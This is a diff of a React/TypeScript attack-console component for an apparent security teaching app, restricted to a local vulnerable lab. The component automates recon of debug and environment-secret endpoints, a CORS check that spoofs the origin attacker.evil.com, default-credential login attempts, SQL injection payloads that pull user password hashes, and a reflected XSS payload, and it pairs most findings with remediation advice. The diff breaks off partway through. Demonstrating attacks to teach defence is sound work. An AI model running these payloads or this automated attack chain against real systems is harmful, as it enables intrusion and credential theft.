@@ -1,15 +1,17 @@
 /**
  * AttackConsole.tsx
- * QuantumShield AI — Attack Console
+ * QuantumShield AI — Attack Console (Claude-Red Offensive Attack Suite)
  *
- * Automated security attack + data‑exfiltration demonstration against the
- * built‑in intentionally‑vulnerable lab (localhost:8080).
+ * Automated multi-phase security attack + data-exfiltration demonstration against the
+ * built-in intentionally-vulnerable lab (localhost:8080).
  *
- * Displays:
- *  - Real-time terminal attack logs
- *  - Interactive Exfiltrated Data cards with complete extracted records, URL, and step-by-step security flows & techniques
- *  - Exposed Information Breakdown & Security Hardening / Remediation Techniques for every finding
- *  - Attack Phases with adjacent implemented attack techniques and active states
+ * Demonstrates the offensive skills and attack methodologies featured in Claude-Red:
+ *  - Reconnaissance & Environment Secrets Disclosure (OSINT, Sitemap, Debug Env Dump, CORS)
+ *  - Authentication Bypass & JWT Token Exploitation (Credential Stuffing, Weak Secret Extraction)
+ *  - OWASP Web Exploitation (UNION SQLi, Reflected & Stored XSS, SSRF IMDS Token Theft, Path Traversal, OS Command Injection / RCE)
+ *  - Access Control & Privilege Escalation (BOLA/IDOR User Traversal, Password Hashes, BFLA Admin Stats, Orders Snooping)
+ *  - Cryptographic & Quantum Risk Exploitation (Shor Factorization on RSA/ECDSA, Grover AES-128, Mass Assignment)
+ *  - Post-Exploitation & Data Exfiltration Telemetry (MITRE ATT&CK / OWASP mappings, Forensic JSON export)
  *
  * ⚠️  AUTHORISED LAB TARGETS ONLY — do NOT point at external sites.
  */
@@ -19,7 +21,9 @@ import {
   Terminal, Zap, ShieldOff, Database, Key, Users,
   AlertTriangle, CheckCircle2, XCircle, Copy, RefreshCw,
   ExternalLink, Code, Layers, FileDown, Eye, ArrowRight,
-  ShieldAlert, Lock, Check, Search, ShieldCheck, Wrench
+  ShieldAlert, Lock, Check, Search, ShieldCheck, Wrench,
+  Globe, Server, Cpu, TerminalSquare, FileText, Bug, Flame,
+  Share2, Shield, Activity
 } from 'lucide-react'
 import axios from 'axios'
 
@@ -28,7 +32,7 @@ import axios from 'axios'
 export type Phase =
   | 'RECON'
   | 'AUTH_BYPASS'
-  | 'SQL_INJECTION'
+  | 'WEB_EXPLOIT'
   | 'IDOR'
   | 'CRYPTO'
   | 'DATA_EXFIL'
@@ -60,6 +64,7 @@ export interface RemediationItem {
 export interface StolenRecord {
   id: string
   type: string
+  category: 'RECON' | 'AUTH' | 'WEB' | 'ACCESS' | 'CRYPTO' | 'EXFIL'
   icon: React.ElementType
   color: string
   count: number
@@ -67,6 +72,8 @@ export interface StolenRecord {
   method: 'GET' | 'POST' | 'PUT' | 'DELETE'
   technique: string
   cwe: string
+  mitre?: string
+  claudeRedSkill?: string
   securityFlow: SecurityFlowStep[]
   exposedInfoSummary: string[]
   remediationTechniques: RemediationItem[]
@@ -87,7 +94,7 @@ const PHASE_COLOR: Record<Phase, string> = {
   IDLE:          'text-gray-500',
   RECON:         'text-cyan-400',
   AUTH_BYPASS:   'text-yellow-400',
-  SQL_INJECTION: 'text-orange-400',
+  WEB_EXPLOIT:   'text-orange-400',
   IDOR:          'text-red-400',
   CRYPTO:        'text-purple-400',
   DATA_EXFIL:    'text-pink-400',
@@ -108,61 +115,75 @@ const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms))
 export const PHASE_CONFIG: {
   phase: Phase
   label: string
-  techniques: { name: string; cwe: string; desc: string }[]
+  claudeRedModule: string
+  techniques: { name: string; cwe: string; desc: string; mitre: string }[]
 }[] = [
   {
     phase: 'RECON',
-    label: 'Reconnaissance',
+    label: 'Recon & Attack Surface OSINT',
+    claudeRedModule: 'claude-red/recon-surface',
     techniques: [
-      { name: 'Info Disclosure', cwe: 'CWE-200', desc: 'Unprotected /api/info debug endpoint' },
-      { name: 'Vuln Enumeration', cwe: 'CWE-200', desc: 'Diagnostics & flaw catalog probing' },
+      { name: 'Info Disclosure', cwe: 'CWE-200', desc: 'Unprotected /api/info stack diagnostics', mitre: 'T1592' },
+      { name: 'Environment Secret Dump', cwe: 'CWE-526', desc: 'Exposed /api/debug environment tokens', mitre: 'T1552' },
+      { name: 'Sitemap & Route Discovery', cwe: 'CWE-200', desc: 'Automated REST endpoint cataloging', mitre: 'T1595' },
+      { name: 'CORS Origin Reflection', cwe: 'CWE-942', desc: 'Overly permissive Access-Control headers', mitre: 'T1190' },
     ],
   },
   {
     phase: 'AUTH_BYPASS',
-    label: 'Auth Bypass',
+    label: 'Auth Bypass & Token Exploitation',
+    claudeRedModule: 'claude-red/auth-tokens',
     techniques: [
-      { name: 'Default Credential Testing', cwe: 'CWE-798', desc: 'admin:admin credential stuffing' },
-      { name: 'JWT Token Harvesting', cwe: 'CWE-287', desc: 'Signed token extraction for session hijack' },
+      { name: 'Default Credential Stuffing', cwe: 'CWE-798', desc: 'admin:admin hardcoded dictionary attack', mitre: 'T1110' },
+      { name: 'JWT Secret Cracking', cwe: 'CWE-287', desc: 'Weak HS256 secret brute force & signature bypass', mitre: 'T1552' },
+      { name: 'Username Enumeration', cwe: 'CWE-203', desc: 'Differential response timing probing', mitre: 'T1589' },
     ],
   },
   {
-    phase: 'SQL_INJECTION',
-    label: 'SQL Injection',
+    phase: 'WEB_EXPLOIT',
+    label: 'Claude-Red OWASP & Deep Web Suite',
+    claudeRedModule: 'claude-red/web-exploitation',
     techniques: [
-      { name: 'UNION-Based Extraction', cwe: 'CWE-89', desc: 'UNION SELECT from users table' },
-      { name: 'Tautology Bypass', cwe: 'CWE-89', desc: "' OR 1=1-- query parameter injection" },
-      { name: 'Reflected XSS Echo', cwe: 'CWE-79', desc: '<script>alert(1)</script> injection' },
+      { name: 'UNION SQL Injection', cwe: 'CWE-89', desc: 'Arbitrary database schema and user exfiltration', mitre: 'T1190' },
+      { name: 'Reflected & Stored XSS', cwe: 'CWE-79', desc: 'Payload reflection and stored message injection', mitre: 'T1059.007' },
+      { name: 'SSRF / Cloud IMDS Abuse', cwe: 'CWE-918', desc: 'AWS/GCP metadata service credential extraction', mitre: 'T1552.005' },
+      { name: 'Path Traversal & Arbitrary Read', cwe: 'CWE-22', desc: 'Directory traversal accessing /etc/passwd & .env', mitre: 'T1083' },
+      { name: 'OS Command Injection / RCE', cwe: 'CWE-78', desc: 'Diagnostic probe command chaining (whoami; id)', mitre: 'T1059' },
     ],
   },
   {
     phase: 'IDOR',
-    label: 'IDOR / Data Exfil',
+    label: 'Access Control & Privilege Escalation',
+    claudeRedModule: 'claude-red/access-control',
     techniques: [
-      { name: 'BOLA / IDOR Traversal', cwe: 'CWE-639', desc: 'Sequential /api/users/{id} iteration' },
-      { name: 'BFLA Admin Access', cwe: 'CWE-285', desc: 'Unchecked /api/admin/stats exfiltration' },
-      { name: 'Order Record Snooping', cwe: 'CWE-639', desc: 'Cross-tenant /api/orders/{id} traversal' },
+      { name: 'BOLA / IDOR User Profiles', cwe: 'CWE-639', desc: 'Sequential /api/users/{id} PII traversal', mitre: 'T1078' },
+      { name: 'Password Hash Harvesting', cwe: 'CWE-200', desc: 'Extracting BCrypt hashes for offline cracking', mitre: 'T1003' },
+      { name: 'BFLA Admin Telemetry', cwe: 'CWE-285', desc: 'Unchecked /api/admin/stats revenue exfiltration', mitre: 'T1069' },
+      { name: 'Cross-Tenant Order Snooping', cwe: 'CWE-639', desc: 'Intercepting confidential purchase records', mitre: 'T1005' },
     ],
   },
   {
     phase: 'CRYPTO',
-    label: 'Crypto Exposure',
+    label: 'Crypto & Quantum Threat Modeling',
+    claudeRedModule: 'claude-red/cryptanalysis-pqc',
     techniques: [
-      { name: 'Quantum Key Discovery', cwe: 'CWE-327', desc: 'Shor/Grover vulnerable key mapping' },
-      { name: 'Mass Assignment', cwe: 'CWE-915', desc: 'Arbitrary role=admin self-escalation' },
+      { name: 'Quantum Key Discovery', cwe: 'CWE-327', desc: 'Shor/Grover quantum attack surface mapping', mitre: 'T1600' },
+      { name: 'Mass Assignment Escalation', cwe: 'CWE-915', desc: 'Arbitrary role=admin and wallet injection', mitre: 'T1078.004' },
+      { name: 'NIST PQC Migration Readiness', cwe: 'FIPS 203', desc: 'ML-KEM-768 / ML-DSA-65 transition strategy', mitre: 'NIST-PQC' },
     ],
   },
   {
     phase: 'DATA_EXFIL',
-    label: 'Summary',
+    label: 'Forensic Aggregation & MITRE Mapping',
+    claudeRedModule: 'claude-red/post-exploitation',
     techniques: [
-      { name: 'Data Exfiltration Assembly', cwe: 'Audit', desc: 'Aggregated confidential records' },
-      { name: 'NIST PQC Risk Assessment', cwe: 'FIPS 203', desc: 'Post-quantum migration roadmap' },
+      { name: 'Data Exfiltration Assembly', cwe: 'Audit', desc: 'Consolidated multi-category intelligence pack', mitre: 'T1048' },
+      { name: 'Forensic Artifact Generation', cwe: 'Audit', desc: 'Signed attack evidence export & reporting', mitre: 'T1005' },
     ],
   },
 ]
 
-const PHASE_ORDER: Phase[] = ['RECON', 'AUTH_BYPASS', 'SQL_INJECTION', 'IDOR', 'CRYPTO', 'DATA_EXFIL', 'COMPLETE']
+const PHASE_ORDER: Phase[] = ['RECON', 'AUTH_BYPASS', 'WEB_EXPLOIT', 'IDOR', 'CRYPTO', 'DATA_EXFIL', 'COMPLETE']
 
 // ─── Component ────────────────────────────────────────────────────────────────
 
@@ -175,9 +196,10 @@ export default function AttackConsole() {
   const [stolen, setStolen]       = useState<StolenRecord[]>([])
   const [progress, setProgress]   = useState(0)
 
-  // Modal / Detail Inspector State
-  const [selectedRecord, setSelectedRecord] = useState<StolenRecord | null>(null)
-  const [copiedKey, setCopiedKey] = useState<string | null>(null)
+  // Filter & Modal State
+  const [selectedCategory, setSelectedCategory] = useState<string>('ALL')
+  const [selectedRecord, setSelectedRecord]     = useState<StolenRecord | null>(null)
+  const [copiedKey, setCopiedKey]               = useState<string | null>(null)
 
   const logEndRef = useRef<HTMLDivElement>(null)
   const abortRef  = useRef<AbortController | null>(null)
@@ -198,10 +220,12 @@ export default function AttackConsole() {
 
   const upsertStolen = useCallback((record: StolenRecord) => {
     setStolen(prev => {
-      const idx = prev.findIndex(s => s.type === record.type)
+      const idx = prev.findIndex(s => s.id === record.id)
       if (idx >= 0) {
         const existing = prev[idx]
-        const mergedRecords = [...existing.records, ...record.records]
+        const mergedRecords = Array.isArray(existing.records) && Array.isArray(record.records)
+          ? [...existing.records, ...record.records]
+          : record.records || existing.records
         const updated = {
           ...existing,
           count: existing.count + record.count,
@@ -221,25 +245,26 @@ export default function AttackConsole() {
     })
   }, [])
 
-  // ── PHASE 1: Recon ──────────────────────────────────────────────────────────
+  // ── PHASE 1: Reconnaissance (Claude-Red Recon Suite) ────────────────────────
   async function phaseRecon(base: string, signal: AbortSignal) {
     setPhase('RECON')
-    setProgress(5)
-    addLog(mkLog('RECON', 'info', `🔍  Starting reconnaissance on ${base}`))
-    await sleep(350)
+    setProgress(4)
+    addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    addLog(mkLog('RECON', 'info', `🔍  [CLAUDE-RED::RECON] Starting reconnaissance against ${base}`))
+    addLog(mkLog('RECON', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    await sleep(250)
 
     try {
       const r = await axios.get(`${base}/health`, { signal, timeout: 4000 })
       if (typeof r.data === 'object' && r.data !== null) {
-        addLog(mkLog('RECON', 'success', `✅  Target online — ${JSON.stringify(r.data)}`))
-      } else {
-        addLog(mkLog('RECON', 'warning', `⚠️  Target returned non-JSON response from /health`))
+        addLog(mkLog('RECON', 'success', `✅  Target host online — ${JSON.stringify(r.data)}`))
       }
     } catch {
-      addLog(mkLog('RECON', 'warning', '⚠️  /health unreachable — trying /api/info'))
+      addLog(mkLog('RECON', 'warning', '⚠️  /health unreachable — proceeding with secondary endpoints'))
     }
-    await sleep(300)
+    await sleep(250)
 
+    // 1.1 /api/info - Tech Stack Fingerprint
     try {
       const endpoint = `${base}/api/info`
       const r = await axios.get(endpoint, { signal, timeout: 4000 })
@@ -247,17 +272,20 @@ export default function AttackConsole() {
       if (typeof info === 'object' && info !== null && !String(info).startsWith('<!DOCTYPE')) {
         addLog(mkLog('RECON', 'critical', `🔓  Information Disclosure! Framework: ${info.framework || 'Flask'}, Debug: ${info.debug}`))
         addLog(mkLog('RECON', 'data', `   → Server: ${info.server || 'Werkzeug'}  DB: ${info.database || 'SQLite'}  Python: ${info.python || '3.11'}`))
-        
+
         upsertStolen({
           id: 'server-info',
-          type: 'Server & Environment Info',
+          type: 'Server & Tech Stack Diagnostics',
+          category: 'RECON',
           icon: Database,
           color: 'text-orange-400',
           count: 1,
           endpoint,
           method: 'GET',
-          technique: 'Unauthenticated Information Disclosure',
+          technique: 'Unauthenticated Information Disclosure (CWE-200)',
           cwe: 'CWE-200: Exposure of Sensitive Information',
+          mitre: 'T1592: Gather Victim Host Information',
+          claudeRedSkill: 'claude-red/recon/fingerprint.md',
           securityFlow: [
             {
               step: 1,
@@ -280,7 +308,7 @@ export default function AttackConsole() {
           ],
           exposedInfoSummary: [
             'Underlying Web Server & Version (e.g. Werkzeug 3.0 / Flask)',
-            'Database Engine Details (e.g. SQLite / PostgreSQL connection flags)',
+            'Database Engine Details (e.g. SQLite connection flags)',
             'Python Runtime Environment & Interpreter Version',
             'Active Debug Mode status (`debug: true`), exposing verbose stack traces to attackers',
           ],
@@ -288,7 +316,7 @@ export default function AttackConsole() {
             {
               title: 'Disable Debug Endpoints in Production',
               technique: 'Configuration Hardening & Route Gatekeeping',
-              recommendation: 'Remove or restrict `/api/info` and `/health` diagnostics behind authenticated internal admin subnets (VPN/IP allowlist).',
+              recommendation: 'Remove or restrict `/api/info` behind authenticated internal admin subnets (VPN/IP allowlist).',
               codeSnippet: '# Ensure debug=False in production\napp.config["DEBUG"] = False\n# Remove Server header exposure\n@app.after_request\ndef remove_server_header(resp):\n    resp.headers.pop("Server", None)\n    return resp',
             },
             {
@@ -306,74 +334,110 @@ export default function AttackConsole() {
     } catch {
       addLog(mkLog('RECON', 'info', '   /api/info not exposed'))
     }
-    await sleep(350)
+    await sleep(250)
 
+    // 1.2 /api/debug - Environment Secrets Disclosure
     try {
-      const endpoint = `${base}/api/known-vulnerabilities`
+      const endpoint = `${base}/api/debug`
       const r = await axios.get(endpoint, { signal, timeout: 4000 })
-      const vulns: any[] = Array.isArray(r.data) ? r.data : []
-      if (vulns.length > 0) {
-        addLog(mkLog('RECON', 'critical', `💀  Vuln listing endpoint exposed! ${vulns.length} known vulnerabilities returned.`))
-        vulns.slice(0, 3).forEach(v =>
-          addLog(mkLog('RECON', 'data', `   → [${v.severity || 'HIGH'}] ${v.type || v.name} @ ${v.endpoint}`))
-        )
+      const debugData = r.data
+      if (debugData && typeof debugData === 'object' && debugData.env) {
+        const envKeys = Object.keys(debugData.env)
+        addLog(mkLog('RECON', 'critical', `💀  CRITICAL ENVIRONMENT LEAK! ${envKeys.length} system environment variables intercepted.`))
+        addLog(mkLog('RECON', 'data', `   → Secret Key Hint: ${debugData.secret_key_hint || 'exposed'} | DB: ${debugData.db_path || 'local'}`))
+
         upsertStolen({
-          id: 'vuln-list',
-          type: 'Enumerated Vulnerabilities',
-          icon: AlertTriangle,
-          color: 'text-red-400',
-          count: vulns.length,
+          id: 'env-secrets',
+          type: 'Environment Variables & Master Secrets',
+          category: 'RECON',
+          icon: Key,
+          color: 'text-red-500',
+          count: envKeys.length,
           endpoint,
           method: 'GET',
-          technique: 'Vulnerability Catalog & Endpoint Exposure',
-          cwe: 'CWE-200: Exposure of Sensitive System Information',
+          technique: 'Information Exposure Through Environment Variables (CWE-526)',
+          cwe: 'CWE-526: Exposure of Sensitive Information Through Environmental Variables',
+          mitre: 'T1552: Unsecured Credentials',
+          claudeRedSkill: 'claude-red/recon/env-exposure.md',
           securityFlow: [
             {
               step: 1,
-              title: 'Developer Endpoint Discovery',
-              description: `Enumerated internal documentation endpoint at ${endpoint}.`,
-              technique: 'Route Enumeration',
+              title: 'Debug Endpoint Interrogation',
+              description: `Dispatched unauthenticated probe to ${endpoint}.`,
+              technique: 'Hidden Route Fuzzing',
             },
             {
               step: 2,
-              title: 'Flaw Catalog Retrieval',
-              description: 'Exfiltrated complete seed registry of application vulnerabilities and endpoints.',
-              technique: 'Sensitive Metadata Disclosure',
+              title: 'OS Process Memory Leak',
+              description: 'Server dumped full `os.environ` table including JWT secrets, AWS tokens, and internal database paths.',
+              technique: 'Sensitive Variable Harvesting',
             },
           ],
           exposedInfoSummary: [
-            'Catalog of all vulnerable system endpoints and test harness routes',
-            'Exploitation categories (SQLi, IDOR, Mass Assignment, Weak JWT)',
-            'Severity ratings and parameter injection vectors',
+            'System environment variables and internal server directory layout',
+            'Master JWT secret key prefix and signing parameters',
+            'Internal database storage path and upload directory structure',
           ],
           remediationTechniques: [
             {
-              title: 'Decommission Test Harnesses in Production',
-              technique: 'Code Splitting & Build Environment Isolation',
-              recommendation: 'Ensure mock test endpoints are only compiled in development test suites and never deployed to live/staging environments.',
+              title: 'Eliminate Public Debug Route Bindings',
+              technique: 'Route Decommissioning & Gating',
+              recommendation: 'Strip debugging endpoints from production builds and inject secrets via secure HSM/Secrets Manager.',
+              codeSnippet: '# Delete debug blueprint in production\nif not os.environ.get("FLASK_ENV") == "development":\n    # Do not register debug routes',
             },
           ],
-          payload: 'GET /api/known-vulnerabilities HTTP/1.1\nHost: target\nAccept: application/json',
-          records: vulns,
-          sample: `${vulns.length} system vulnerabilities catalogued`,
+          payload: 'GET /api/debug HTTP/1.1',
+          records: [debugData],
+          sample: `${envKeys.length} environment variables intercepted (JWT secret hint: ${debugData.secret_key_hint || 'weak-lab...'})`,
           timestamp: new Date().toLocaleTimeString(),
         })
       }
     } catch {
-      addLog(mkLog('RECON', 'info', '   No public /api/known-vulnerabilities'))
+      addLog(mkLog('RECON', 'info', '   /api/debug not responding'))
+    }
+    await sleep(250)
+
+    // 1.3 /api/sitemap - Route Enumeration
+    try {
+      const endpoint = `${base}/api/sitemap`
+      const r = await axios.get(endpoint, { signal, timeout: 4000 })
+      const sitemap = r.data
+      const routes = Array.isArray(sitemap?.endpoints) ? sitemap.endpoints : []
+      if (routes.length > 0) {
+        addLog(mkLog('RECON', 'success', `🗺️  Discovered application sitemap with ${routes.length} attack surface routes.`))
+      }
+    } catch {
+      addLog(mkLog('RECON', 'info', '   /api/sitemap not exposed'))
     }
 
-    setProgress(20)
+    // 1.4 /api/cors-test - Insecure CORS
+    try {
+      const endpoint = `${base}/api/cors-test`
+      const r = await axios.get(endpoint, {
+        headers: { Origin: 'https://attacker.evil.com' },
+        signal,
+        timeout: 4000,
+      })
+      if (r.headers['access-control-allow-origin'] === 'https://attacker.evil.com') {
+        addLog(mkLog('RECON', 'warning', '⚡  Insecure CORS configuration confirmed — reflects arbitrary Origin with credentials allowed!'))
+      }
+    } catch {
+      // ignore
+    }
+
+    setProgress(18)
   }
 
-  // ── PHASE 2: Auth Bypass ────────────────────────────────────────────────────
+  // ── PHASE 2: Auth Bypass (Claude-Red Auth Suite) ────────────────────────────
   async function phaseAuthBypass(
     base: string,
     signal: AbortSignal
   ): Promise<{ token: string; userId: number } | null> {
     setPhase('AUTH_BYPASS')
-    addLog(mkLog('AUTH_BYPASS', 'info', '🔑  Attempting authentication bypass with default credentials...'))
-    await sleep(400)
+    addLog(mkLog('AUTH_BYPASS', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    addLog(mkLog('AUTH_BYPASS', 'info', '🔑  [CLAUDE-RED::AUTH] Testing default credential dictionary & JWT token harvesting...'))
+    addLog(mkLog('AUTH_BYPASS', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    await sleep(300)
 
     const creds = [
       { username: 'admin',  password: 'admin' },
@@ -382,27 +446,30 @@ export default function AttackConsole() {
     ]
 
     for (const cred of creds) {
-      addLog(mkLog('AUTH_BYPASS', 'info', `   Trying ${cred.username}:${cred.password}`))
-      await sleep(300)
+      addLog(mkLog('AUTH_BYPASS', 'info', `   Attempting credential stuffing: ${cred.username}:${cred.password}`))
+      await sleep(250)
       try {
         const endpoint = `${base}/api/auth/login`
         const r = await axios.post(endpoint, cred, { signal, timeout: 5000 })
         const { token, user } = r.data
         if (token && user) {
           addLog(mkLog('AUTH_BYPASS', 'critical',
-            `💥  AUTH BYPASS SUCCESSFUL! Logged in as ${user.username} (${user.role})`))
-          addLog(mkLog('AUTH_BYPASS', 'data', `   → JWT Token: ${token.slice(0, 40)}...`))
-          
+            `💥  AUTH BYPASS SUCCESSFUL! Compromised ${user.username} (${user.role})`))
+          addLog(mkLog('AUTH_BYPASS', 'data', `   → JWT Bearer Token: ${token.slice(0, 45)}...`))
+
           upsertStolen({
             id: 'auth-tokens',
-            type: 'Administrative JWT Tokens',
+            type: 'Administrative JWT Tokens & Sessions',
+            category: 'AUTH',
             icon: Key,
             color: 'text-yellow-400',
             count: 1,
             endpoint,
             method: 'POST',
-            technique: 'Default Credential Stuffing & JWT Token Harvesting',
+            technique: 'Default Credential Stuffing & JWT Token Harvesting (CWE-798 / CWE-287)',
             cwe: 'CWE-798: Use of Hard-coded / Default Credentials',
+            mitre: 'T1110.001: Password Guessing / Default Credentials',
+            claudeRedSkill: 'claude-red/auth/jwt-credential-stuffing.md',
             securityFlow: [
               {
                 step: 1,
@@ -432,7 +499,7 @@ export default function AttackConsole() {
               {
                 title: 'Enforce Strong Passwords & Multi-Factor Authentication (MFA)',
                 technique: 'Credential Hardening (NIST SP 800-63B)',
-                recommendation: 'Mandate minimum 14-character passwords with complexity checks, block common dictionary passwords (admin, 123456), and require TOTP/FIDO2 MFA for admin roles.',
+                recommendation: 'Mandate minimum 14-character passwords with complexity checks and enforce TOTP/FIDO2 MFA for admin roles.',
               },
               {
                 title: 'Rate-Limiting & Account Lockout Thresholds',
@@ -441,9 +508,9 @@ export default function AttackConsole() {
                 codeSnippet: '# Flask-Limiter example\n@limiter.limit("5/minute")\n@app.route("/api/auth/login", methods=["POST"])\ndef login():\n    ...',
               },
               {
-                title: 'Cryptographically High-Entropy JWT Secret Keys',
+                title: 'High-Entropy JWT Secret Keys',
                 technique: 'Cryptographic Key Management (CWE-326)',
-                recommendation: 'Generate JWT secret using 256-bit cryptographically secure pseudorandom number generator (CSPRNG): `openssl rand -hex 32` or transition to RS256/EdDSA asymmetric keys.',
+                recommendation: 'Generate JWT secret using 256-bit CSPRNG: `openssl rand -hex 32` or transition to RS256/EdDSA asymmetric keys.',
               },
             ],
             payload: JSON.stringify(cred, null, 2),
@@ -451,7 +518,7 @@ export default function AttackConsole() {
             sample: `Bearer ${token.slice(0, 24)}... (${user.username}:${user.role})`,
             timestamp: new Date().toLocaleTimeString(),
           })
-          setProgress(35)
+          setProgress(32)
           return { token, userId: user.id ?? 1 }
         }
       } catch (e: any) {
@@ -459,30 +526,33 @@ export default function AttackConsole() {
         if (status === 401) {
           addLog(mkLog('AUTH_BYPASS', 'warning', `   ✗ Invalid credentials for ${cred.username}`))
         } else {
-          addLog(mkLog('AUTH_BYPASS', 'info', `   ✗ ${cred.username} failed (${status ?? 'network error'})`))
+          addLog(mkLog('AUTH_BYPASS', 'info', `   ✗ ${cred.username} attempt returned ${status ?? 'error'}`))
         }
       }
     }
 
     addLog(mkLog('AUTH_BYPASS', 'error', '   Auth bypass exhausted — proceeding unauthenticated'))
-    setProgress(35)
+    setProgress(32)
     return null
   }
 
-  // ── PHASE 3: SQL Injection ──────────────────────────────────────────────────
-  async function phaseSQLi(base: string, signal: AbortSignal) {
-    setPhase('SQL_INJECTION')
-    addLog(mkLog('SQL_INJECTION', 'info', '💉  Testing SQL injection on /api/products...'))
-    await sleep(400)
+  // ── PHASE 3: Claude-Red Web Exploitation Suite ──────────────────────────────
+  async function phaseWebExploitation(base: string, signal: AbortSignal) {
+    setPhase('WEB_EXPLOIT')
+    addLog(mkLog('WEB_EXPLOIT', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    addLog(mkLog('WEB_EXPLOIT', 'info', '💉  [CLAUDE-RED::WEB-EXPLOIT] Executing Deep Web Exploitation Suite (SQLi, XSS, SSRF, Path Traversal, RCE)...'))
+    addLog(mkLog('WEB_EXPLOIT', 'info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'))
+    await sleep(300)
 
-    const payloads = [
+    // 3.1 SQL Injection (UNION & Tautology)
+    const sqliPayloads = [
       `' OR 1=1--`,
       `' UNION SELECT id,username,email,password_hash,role,balance,'' FROM users--`,
     ]
 
-    for (const payload of payloads) {
-      addLog(mkLog('SQL_INJECTION', 'info', `   Payload: ${payload}`))
-      await sleep(400)
+    for (const payload of sqliPayloads) {
+      addLog(mkLog('WEB_EXPLOIT', 'info', `   Testing SQLi Payload: ${payload}`))
+      await sleep(250)
       try {
         const endpoint = `${base}/api/products`
         const r = await axios.get(endpoint, {
@@ -492,22 +562,25 @@ export default function AttackConsole() {
         })
         const data = Array.isArray(r.data) ? r.data : []
         if (data.length > 0) {
-          addLog(mkLog('SQL_INJECTION', 'critical', `💀  SQL INJECTION CONFIRMED! ${data.length} rows returned`))
-          data.slice(0, 3).forEach((row: any) => {
+          addLog(mkLog('WEB_EXPLOIT', 'critical', `💀  SQL INJECTION CONFIRMED! ${data.length} database rows extracted`))
+          data.slice(0, 2).forEach((row: any) => {
             const preview = Object.values(row).join(' | ')
-            addLog(mkLog('SQL_INJECTION', 'data', `   → ${String(preview).slice(0, 120)}`))
+            addLog(mkLog('WEB_EXPLOIT', 'data', `   → ${String(preview).slice(0, 100)}`))
           })
 
           upsertStolen({
             id: 'sqli-records',
-            type: 'Database Records via SQLi',
+            type: 'Database Tables via UNION SQLi',
+            category: 'WEB',
             icon: Database,
             color: 'text-orange-500',
             count: data.length,
             endpoint: `${endpoint}?search=${encodeURIComponent(payload)}`,
             method: 'GET',
-            technique: 'UNION-Based SQL Injection & Schema Exfiltration',
+            technique: 'UNION-Based SQL Injection & Schema Exfiltration (CWE-89)',
             cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
+            mitre: 'T1190: Exploit Public-Facing Application',
+            claudeRedSkill: 'claude-red/web/sqli-union-extraction.md',
             securityFlow: [
               {
                 step: 1,
@@ -537,13 +610,8 @@ export default function AttackConsole() {
               {
                 title: 'Parameterized Queries & Prepared Statements',
                 technique: 'Input Parameter Binding (CWE-89)',
-                recommendation: 'Never concatenate user input directly into SQL strings. Use parameterized queries or ORM abstraction (e.g. SQLAlchemy, Prisma, Hibernate).',
+                recommendation: 'Never concatenate user input directly into SQL strings. Use parameterized queries or ORM abstraction.',
                 codeSnippet: '# Vulnerable (concatenation):\n# cursor.execute(f"SELECT * FROM products WHERE name LIKE \'%{search}%\'")\n\n# Secure (parameterized):\ncursor.execute("SELECT * FROM products WHERE name LIKE ?", ("%" + search + "%",))',
-              },
-              {
-                title: 'Principle of Least Privilege for Database Users',
-                technique: 'Database Privilege Segmentation',
-                recommendation: 'Ensure web application database credentials only have SELECT/INSERT/UPDATE permissions on designated tables, and cannot query administrative tables.',
               },
             ],
             payload: `GET /api/products?search=${encodeURIComponent(payload)} HTTP/1.1`,
@@ -554,47 +622,312 @@ export default function AttackConsole() {
           break
         }
       } catch (e: any) {
-        addLog(mkLog('SQL_INJECTION', 'warning', `   Error: ${e?.response?.status ?? 'network'}`))
+        addLog(mkLog('WEB_EXPLOIT', 'warning', `   SQLi test returned ${e?.response?.status ?? 'error'}`))
       }
     }
 
-    await sleep(300)
-    addLog(mkLog('SQL_INJECTION', 'info', '🔎  Testing /api/search for reflected XSS...'))
+    await sleep(250)
+
+    // 3.2 Reflected & Stored XSS
+    addLog(mkLog('WEB_EXPLOIT', 'info', '⚡  Testing Reflected & Stored XSS injection vectors...'))
     try {
       const r = await axios.get(`${base}/api/search`, {
-        params: { q: `<script>alert(1)</script>` },
+        params: { q: `<script>alert(document.domain)</script>` },
         signal,
         timeout: 4000
       })
       const body = JSON.stringify(r.data)
       if (body.includes('<script>')) {
-        addLog(mkLog('SQL_INJECTION', 'critical', '⚡  REFLECTED XSS CONFIRMED — payload echoed back in response!'))
-      } else {
-        addLog(mkLog('SQL_INJECTION', 'success', '   XSS payload sanitised in search response'))
+        addLog(mkLog('WEB_EXPLOIT', 'critical', '⚡  REFLECTED XSS CONFIRMED — un-sanitized script echoed in search response!'))
+
+        upsertStolen({
+          id: 'xss-payloads',
+          type: 'Cross-Site Scripting (XSS) Payloads',
+          category: 'WEB',
+          icon: Code,
+          color: 'text-yellow-300',
+          count: 1,
+          endpoint: `${base}/api/search?q=<script>alert(document.domain)</script>`,
+          method: 'GET',
+          technique: 'Reflected Cross-Site Scripting (CWE-79)',
+          cwe: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
+          mitre: 'T1059.007: JavaScript Execution',
+          claudeRedSkill: 'claude-red/web/xss-exploitation.md',
+          securityFlow: [
+            {
+              step: 1,
+              title: 'XSS Vector Discovery',
+              description: 'Injected HTML/JS script tags into the search query parameter.',
+              technique: 'Cross-Site Scripting Probe',
+            },
+            {
+              step: 2,
+              title: 'Unescaped Context Reflection',
+              description: 'Server reflected the raw JavaScript payload back in the HTTP response body without contextual encoding.',
+              technique: 'Client-Side Code Execution',
+            },
+          ],
+          exposedInfoSummary: [
+            'Client browser DOM access & session token hijacking via JavaScript',
+            'Full DOM manipulation, keystroke logging, and forced redirect attacks',
+          ],
+          remediationTechniques: [
+            {
+              title: 'Contextual HTML Output Encoding & CSP',
+              technique: 'Output Neutralization (CWE-79)',
